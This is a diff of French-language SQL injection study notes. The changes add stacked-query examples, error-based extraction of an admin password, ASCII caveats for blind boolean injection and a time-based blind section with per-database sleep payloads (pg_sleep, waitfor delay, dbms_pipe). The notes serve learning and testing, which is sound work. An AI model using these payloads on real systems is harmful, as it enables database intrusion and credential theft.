@@ -71,6 +71,10 @@ where col = $var3
 
 delete from ma_table
 where col = $var;
+
+-- QUERIES STACKABLES (hors Oracle)
+(Query A); (Query B)
+select * from products where category = ''; select * from users--'
 ```
 # Mécanismes de base des SQLi
 ## Obtenir les métadonnées
@@ -193,6 +197,22 @@ select * from products where category = '' union select ... from t--'
 -- >> err : nb ou types colonne incompatible.
 -- >> pas err : résultats obtenus.
 ```
+#### Erreur renvoyant les données
+
+> **But** : Générer un message d'erreur contenant les valeurs.
+```sql
+select * from users where username = $user and password = $pass
+```
+
+- `' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--`
+```sql
+select * from users where username = '' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--' and password = ''
+-- >> Conversion failed when converting the varchar value 'password1234' to datatype int
+```
+
+| Oracle | MSSQL                                          | PgSQL                                            | MySQL                                                                                         |
+| ------ | ---------------------------------------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------- |
+| /      | select 'foo' where<br>1 = (select ... limit 1) | select cast((<br>select ... limit 1<br>) as int) | select 'foo' where<br>1=1 and extractvalue(<br>1, concat(0x5c, (<br>select ... limit 1<br>))) |
 ### Compacter les données
 
 > **But** : concaténer les données dans un unique varchar.
@@ -209,22 +229,6 @@ select * from products where category = $var
 ```sql
 select * from products where category = '' union select cast(col1 as varchar) || ' ~ ' || ... || ' ~ ' || cast(coln as varchar), ..., null from t--'
 ```
-### Erreur renvoyant les données
-
-> **But** : Générer un message d'erreur contenant les valeurs.
-```sql
-select * from users where username = $user and password = $pass
-```
-
-- `' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--`
-```sql
-select * from users where username = '' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--' and password = ''
--- >> Conversion failed when converting the varchar value 'password1234' to datatype int
-```
-
-| Oracle | MSSQL                                          | PgSQL                                            | MySQL                                                                                         |
-| ------ | ---------------------------------------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------- |
-| /      | select 'foo' where<br>1 = (select ... limit 1) | select cast((<br>select ... limit 1<br>) as int) | select 'foo' where<br>1=1 and extractvalue(<br>1, concat(0x5c, (<br>select ... limit 1<br>))) |
 ### Modifier la table
 
 > **But** : altérer la table.
@@ -250,6 +254,8 @@ Techniques utilisées pour remarquer une différence de traitement. Renvoie des 
 > **Prérequis** : Utiliser **requêtes unicellulaires** pour utiliser comparaisons.
 > **Astuce** : Analyser les diffs sur page avant et après requête.
 > **Astuce** : Énumération explicite.
+> 
+> **Attention** : `<`, `>` sur str utilise ordre ASCII comme en C.
 ```sql
 select * from products where category = $var
 ```
@@ -265,6 +271,7 @@ select * from products where category = '' and (select substring(password, 1, 1)
 
 -- Complémentaire de
 select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') < 'm'--'
+-- >> Attention : les chiffres sont < 'm' en ASCII
 ```
 
 | Opération                             | Oracle            | MSSQL                         | PgSQL                           | MySQL                                  |
@@ -273,8 +280,7 @@ select * from products where category = '' and (select substring(password, 1, 1)
 | Alternatives à substring<br>l: length | /                 | `left(x, l)`<br>`right(x, l)` | `left(x, l)`<br>`right(x, l)`   | `left(x, l)`<br>`right(x, l)`          |
 | Ascii                                 | `ascii(x)`        | `ascii(x)`                    | `ascii(x)`                      | `ascii(x)`<br>`ord(x)`                 |
 | Length                                | `length(x)`       | `len(x)`                      | `length(x)`<br>`char_length(x)` | `length(x)`<br>`char_length(x)`        |
-## Par erreur
-### Erreur conditionnelle
+## Par erreur conditionnelle
 
 > **But** : Générer une erreur SQL en fonction d'une condition injectée.
 ```sql
@@ -290,4 +296,19 @@ select * from products where category = '' and (select case when (cond) then 1/0
 | ----------------------------------------------------------------------- | ---------------------------------------------------- | ------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
 | select case when<br>(cond) then to_char(1/0)<br>else null end from dual | select case when<br>(cond) then 1/0<br>else null end | 1 = (select case when<br>(cond) then 1/(select 0)<br>else null end) | select if (cond, (select<br>table_name from<br>information_schema.tables),<br>'a') |
 | /                                                                       | select 1/0<br>where cond                             | select 1/(case when<br>(cond) then 0 else<br>1 end)                 | select exp(999 where (cond))                                                       
-## Par délai
+## Par délai conditionnel
+
+> **But** : Générer un délai en fonction d'une condition injectée.
+```sql
+select * from products where category = $var
+```
+
+- `' and (select case when (cond) then pg_sleep(5) else pg_sleep(0) end) is not null--`
+```sql
+select * from products where category = '' and (select case when (cond) then pg_sleep(5) else pg_sleep(0) end) is not null--'
+```
+
+| Oracle                                                                                                       | MSSQL                                                                                           | PgSQL                                                                                | MySQL                                                      |
+| ------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ---------------------------------------------------------- |
+| dbms_pipe.receive_message('a', x)                                                                            | waitfor delay '0:0:x'                                                                           | pg_sleep(x)                                                                          | sleep(x)                                                   |
+| 1=(select case when<br>(cond) then<br>'a' \|\| dbms_pipe.receive_message('a', 5)<br>else null end from dual) | 1=(select case when<br>(cond) then (select<br>1 where 1=1 waitfor delay '0:0:5')<br>else 1 end) | (select case when (cond)<br>then pg_sleep(x) else<br>pg_sleep(0) end) is not<br>null | 1=(select case when<br>(cond) then sleep(5)<br>else 0 end) |
